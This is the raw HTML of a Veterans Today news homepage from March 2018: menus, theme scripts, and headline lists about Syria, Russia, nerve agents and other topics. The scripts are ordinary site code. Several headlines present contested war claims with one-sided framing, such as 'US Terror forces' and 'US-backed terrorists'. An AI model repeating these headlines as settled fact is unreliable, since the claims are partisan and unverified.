</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_51_5aaf778c2577e" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="" href="https://www.veteranstoday.com/category/world-global/">All</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_52_5aaf778c25809" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="28652" href="https://www.veteranstoday.com/category/world-global/africa-world-global/">Africa</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_53_5aaf778c258a6" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="14506" href="https://www.veteranstoday.com/category/world-global/americas/">Americas</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_54_5aaf778c25942" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="14503" href="https://www.veteranstoday.com/category/world-global/asia-world-global/">Asia</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_55_5aaf778c259d8" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="14505" href="https://www.veteranstoday.com/category/world-global/europe-world-global/">Europe</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_56_5aaf778c25a6c" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="11770" href="https://www.veteranstoday.com/category/world-global/middle-east-issues/">Middle East</a><a class="mega-menu-sub-cat-td_uid_50_5aaf778c24bb2" id="td_uid_57_5aaf778c25b00" data-td_block_id="td_uid_50_5aaf778c24bb2" data-td_filter_value="29565" href="https://www.veteranstoday.com/category/world-global/russia-world-global/">Russia</a></div></div><div id=td_uid_50_5aaf778c24bb2 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/italian-miseries/" rel="bookmark" title="Italian Political Miseries"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-218x150.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-218x150.gif 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-100x70.gif 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Italian Political Miseries" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/italian-miseries/" rel="bookmark" title="Italian Political Miseries">Italian Political Miseries</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/how-syrian-conflict-sparked-new-cold-war/" rel="bookmark" title="How Syrian Conflict Sparked New Cold War?"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="How Syrian Conflict Sparked New Cold War?" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/how-syrian-conflict-sparked-new-cold-war/" rel="bookmark" title="How Syrian Conflict Sparked New Cold War?">How Syrian Conflict Sparked New Cold War?</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/opcw-no-member-states-known-to-possess-novichok-class-nerve-agents/" rel="bookmark" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/opcw-no-member-states-known-to-possess-novichok-class-nerve-agents/" rel="bookmark" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents">OPCW: No member states known to possess ‘Novichok-class’ nerve agents</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/israel-prepares-for-war-with-russia/" rel="bookmark" title="Israel Prepares for War with Russia"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Israel Prepares for War with Russia" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/israel-prepares-for-war-with-russia/" rel="bookmark" title="Israel Prepares for War with Russia">Israel Prepares for War with Russia</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_50_5aaf778c24bb2" data-td_block_id="td_uid_50_5aaf778c24bb2" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_50_5aaf778c24bb2" data-td_block_id="td_uid_50_5aaf778c24bb2" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
</ul></div></div>
<div class="header-search-wrap">
<div class="td-search-btns-wrap">
<a id="td-header-search-button" href="#" role="button" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
<a id="td-header-search-button-mob" href="#" role="button" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
</div>
<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
<form method="get" class="td-search-form" action="https://www.veteranstoday.com/">
<div role="search" class="td-head-form-search-wrap">
<input id="td-header-search" type="text" value="" name="s" autocomplete="off" /><input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="Search" />
</div>
</form>
<div id="td-aj-search"></div>
</div>
</div>
</div>
</div>
</div>
</div>
 <div class="td-main-content-wrap td-main-page-wrap td-container-wrap">
<div class="td-container tdc-content-wrap">
<div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_trending_now td_uid_58_5aaf778c2c0b2_rand td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_58_5aaf778c2c0b2"><script>var block_td_uid_58_5aaf778c2c0b2 = new tdBlock();
block_td_uid_58_5aaf778c2c0b2.id = "td_uid_58_5aaf778c2c0b2";
block_td_uid_58_5aaf778c2c0b2.atts = '{"limit":5,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_58_5aaf778c2c0b2_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_58_5aaf778c2c0b2_rand","tdc_css_class_style":"td_uid_58_5aaf778c2c0b2_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_58_5aaf778c2c0b2.td_column_number = "3";
block_td_uid_58_5aaf778c2c0b2.block_type = "td_block_trending_now";
block_td_uid_58_5aaf778c2c0b2.post_count = "5";
block_td_uid_58_5aaf778c2c0b2.found_posts = "17902";
block_td_uid_58_5aaf778c2c0b2.header_color = "";
block_td_uid_58_5aaf778c2c0b2.ajax_pagination_infinite_stop = "";
block_td_uid_58_5aaf778c2c0b2.max_num_pages = "3581";
tdBlocksArray.push(block_td_uid_58_5aaf778c2c0b2);
</script><div id=td_uid_58_5aaf778c2c0b2 class="td_block_inner">
<div class="td-block-row"><div class="td-trending-now-wrapper" id="td_uid_58_5aaf778c2c0b2" data-start=""><div class="td-trending-now-title">Trending Now</div><div class="td-trending-now-display-area">
<div class="td_module_trending_now td-trending-now-post-0 td-trending-now-post">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/" rel="bookmark" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For">Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For</a></h3>
</div>
<div class="td_module_trending_now td-trending-now-post-1 td-trending-now-post">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/terrorist-capabilities-laid-bare-in-an-eastern-ghouta-chemical-lab/" rel="bookmark" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab">Terrorist capabilities laid bare in an Eastern Ghouta chemical lab</a></h3>
</div>
<div class="td_module_trending_now td-trending-now-post-2 td-trending-now-post">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/neo-teetering-on-the-edge-of-nuclear-war/" rel="bookmark" title="NEO &#8211; Teetering on the Edge of Nuclear War">NEO &#8211; Teetering on the Edge of Nuclear War</a></h3>
</div>
<div class="td_module_trending_now td-trending-now-post-3 td-trending-now-post">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/should-you-buy-a-gun-a-guide/" rel="bookmark" title="Should You Buy a Gun? – A Guide">Should You Buy a Gun? – A Guide</a></h3>
</div>
<div class="td_module_trending_now td-trending-now-post-4 td-trending-now-post">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/your-success-and-leaps-of-faith-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series">Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series</a></h3>
</div>
</div><div class="td-next-prev-wrap"><a href="#" class="td_ajax-prev-pagex td-trending-now-nav-left" data-block-id="td_uid_58_5aaf778c2c0b2" data-moving="left" data-control-start=""><i class="td-icon-menu-left"></i></a><a href="#" class="td_ajax-next-pagex td-trending-now-nav-right" data-block-id="td_uid_58_5aaf778c2c0b2" data-moving="right" data-control-start=""><i class="td-icon-menu-right"></i></a></div></div></div></div></div> <div class="td_block_wrap td_block_big_grid_3 td_uid_59_5aaf778c2d4c3_rand td-grid-style-1 td-hover-1 td-big-grids td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_59_5aaf778c2d4c3"><div id=td_uid_59_5aaf778c2d4c3 class="td_block_inner"><div class="td-big-grid-wrapper">
<div class="td_module_mx5 td-animation-stack td-big-grid-post-0 td-big-grid-post td-big-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/19/terrorist-capabilities-laid-bare-in-an-eastern-ghouta-chemical-lab/" rel="bookmark" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab"><img width="534" height="462" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-2-534x462.jpg" alt="" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/government-and-politics/corruption/" class="td-post-category">Corruption</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/terrorist-capabilities-laid-bare-in-an-eastern-ghouta-chemical-lab/" rel="bookmark" title="Terrorist capabilities laid bare in an Eastern Ghouta chemical lab">Terrorist capabilities laid bare in an Eastern Ghouta chemical lab</a></h3> </div>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/admin/">VT</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-19T01:39:45+00:00">March 19, 2018</time></span> </div>
</div>
</div>
</div>
<div class="td-big-grid-scroll">
<div class="td_module_mx11 td-animation-stack td-big-grid-post-1 td-big-grid-post td-medium-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/neo-teetering-on-the-edge-of-nuclear-war/" rel="bookmark" title="NEO &#8211; Teetering on the Edge of Nuclear War"><img width="533" height="261" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-533x261.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-533x261.jpg 533w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-324x160.jpg 324w" sizes="(max-width: 533px) 100vw, 533px" alt="" title="NEO &#8211; Teetering on the Edge of Nuclear War" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/wars/" class="td-post-category">WarZone</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/neo-teetering-on-the-edge-of-nuclear-war/" rel="bookmark" title="NEO &#8211; Teetering on the Edge of Nuclear War">NEO &#8211; Teetering on the Edge of Nuclear War</a></h3> </div>
</div>
</div>
</div>
<div class="td_module_mx6 td-animation-stack td-big-grid-post-2 td-big-grid-post td-small-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/should-you-buy-a-gun-a-guide/" rel="bookmark" title="Should You Buy a Gun? – A Guide"><img width="265" height="198" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-265x198.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-265x198.jpg 265w, https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-80x60.jpg 80w" sizes="(max-width: 265px) 100vw, 265px" alt="" title="Should You Buy a Gun? – A Guide" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/should-you-buy-a-gun-a-guide/" rel="bookmark" title="Should You Buy a Gun? – A Guide">Should You Buy a Gun? – A Guide</a></h3> </div>
</div>
</div>
</div>
<div class="td_module_mx6 td-animation-stack td-big-grid-post-3 td-big-grid-post td-small-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/your-success-and-leaps-of-faith-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series"><img width="265" height="198" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-265x198.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-265x198.jpg 265w, https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-80x60.jpg 80w" sizes="(max-width: 265px) 100vw, 265px" alt="" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/your-success-and-leaps-of-faith-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series">Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series</a></h3> </div>
</div>
</div>
</div>
</div></div><div class="clearfix"></div></div></div> </div></div></div></div><div class="vc_row wpb_row td-pb-row td-ss-row"><div class="wpb_column vc_column_container td-pb-span8"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_1 td_uid_60_5aaf778c30089_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-2" data-td-block-uid="td_uid_60_5aaf778c30089">
<style>
body .td_uid_60_5aaf778c30089_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_60_5aaf778c30089_rand .td-pulldown-filter-link:hover,
            body .td_uid_60_5aaf778c30089_rand .td-subcat-item a:hover,
            body .td_uid_60_5aaf778c30089_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_60_5aaf778c30089_rand .td_quote_on_blocks,
            body .td_uid_60_5aaf778c30089_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_60_5aaf778c30089_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_60_5aaf778c30089_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_60_5aaf778c30089_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_60_5aaf778c30089_rand .td-next-prev-wrap a:hover,
            body .td_uid_60_5aaf778c30089_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_60_5aaf778c30089_rand .block-title > *,
            body .td_uid_60_5aaf778c30089_rand .td-trending-now-title,
            body .td_uid_60_5aaf778c30089_rand .td-read-more a,
            body .td_uid_60_5aaf778c30089_rand .td-weather-information:before,
            body .td_uid_60_5aaf778c30089_rand .td-weather-week:before,
            body .td_uid_60_5aaf778c30089_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_60_5aaf778c30089_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_60_5aaf778c30089_rand .td-post-category,
            body .td_uid_60_5aaf778c30089_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_60_5aaf778c30089_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_60_5aaf778c30089_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_60_5aaf778c30089 = new tdBlock();
block_td_uid_60_5aaf778c30089.id = "td_uid_60_5aaf778c30089";
block_td_uid_60_5aaf778c30089.atts = '{"limit":5,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"What\u0027s Hot","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"65,7270,16,70365,35707,36,28,42025,70361,15,7271","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_60_5aaf778c30089_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_60_5aaf778c30089_rand","tdc_css_class_style":"td_uid_60_5aaf778c30089_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_60_5aaf778c30089.td_column_number = "2";
block_td_uid_60_5aaf778c30089.block_type = "td_block_1";
block_td_uid_60_5aaf778c30089.post_count = "5";
block_td_uid_60_5aaf778c30089.found_posts = "17898";
block_td_uid_60_5aaf778c30089.header_color = "#990000";
block_td_uid_60_5aaf778c30089.ajax_pagination_infinite_stop = "";
block_td_uid_60_5aaf778c30089.max_num_pages = "3580";
tdBlocksArray.push(block_td_uid_60_5aaf778c30089);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">What&#039;s Hot</span></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_60_5aaf778c30089"><ul class="td-subcat-list" id="td_pulldown_td_uid_60_5aaf778c30089_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_61_5aaf778c30943" data-td_filter_value="" data-td_block_id="td_uid_60_5aaf778c30089" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_62_5aaf778c30980" data-td_filter_value="65" data-td_block_id="td_uid_60_5aaf778c30089" href="#">WarZone</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_63_5aaf778c309ba" data-td_filter_value="7270" data-td_block_id="td_uid_60_5aaf778c30089" href="#">World</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_64_5aaf778c309f4" data-td_filter_value="16" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Government</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_65_5aaf778c30a2e" data-td_filter_value="70365" data-td_block_id="td_uid_60_5aaf778c30089" href="#">VT Radio</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_66_5aaf778c30a67" data-td_filter_value="35707" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Investigations</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_67_5aaf778c30aa1" data-td_filter_value="36" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Life</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_68_5aaf778c30ada" data-td_filter_value="28" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Military</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_69_5aaf778c30b13" data-td_filter_value="42025" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Money</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_70_5aaf778c30b4c" data-td_filter_value="70361" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Veterans News</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_71_5aaf778c30b85" data-td_filter_value="15" data-td_block_id="td_uid_60_5aaf778c30089" href="#">Health</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_72_5aaf778c30bbf" data-td_filter_value="7271" data-td_block_id="td_uid_60_5aaf778c30089" href="#">History</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_60_5aaf778c30089 class="td_block_inner">
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/" rel="bookmark" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-515-324x235.jpg" alt="" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For" /></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/" rel="bookmark" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For">Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/sputnik/">Media Partner - Sputnik News</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-19T02:01:37+00:00">March 19, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/#respond">0</a></div> </div>
<div class="td-excerpt">
During his address to the Federal Assembly, President Vladimir Putin shocked observers when he said that Russia&#039;s progress in laser weaponry was &quot;not just... </div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/breaking-us-terror-forces-plead-for-ceasefire-in-east-ghouta/" rel="bookmark" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/breaking-us-terror-forces-plead-for-ceasefire-in-east-ghouta/" rel="bookmark" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta">Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T15:08:58+00:00">March 18, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/assads-exdous-68000-from-east-ghouta-freed-from-us-backed-terrorists/" rel="bookmark" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/assads-exdous-68000-from-east-ghouta-freed-from-us-backed-terrorists/" rel="bookmark" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists">ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T11:52:52+00:00">March 18, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/new-russian-missiles-putin/" rel="bookmark" title="New Russian Missiles:  West makes Putin sick"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="New Russian Missiles:  West makes Putin sick" /><span class="td-video-play-ico td-video-small"><img width="20" height="20" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/video-small.png" alt="video" /></span></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/new-russian-missiles-putin/" rel="bookmark" title="New Russian Missiles:  West makes Putin sick">New Russian Missiles: West makes Putin sick</a></h3> <div class="td-module-meta-info">
 <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T11:17:33+00:00">March 18, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/italian-miseries/" rel="bookmark" title="Italian Political Miseries"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-100x70.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-100x70.gif 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/polizia-italy-protest-218x150.gif 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Italian Political Miseries" /><span class="td-video-play-ico td-video-small"><img width="20" height="20" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/video-small.png" alt="video" /></span></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/italian-miseries/" rel="bookmark" title="Italian Political Miseries">Italian Political Miseries</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T11:07:52+00:00">March 18, 2018</time></span> </div>
</div>
</div>
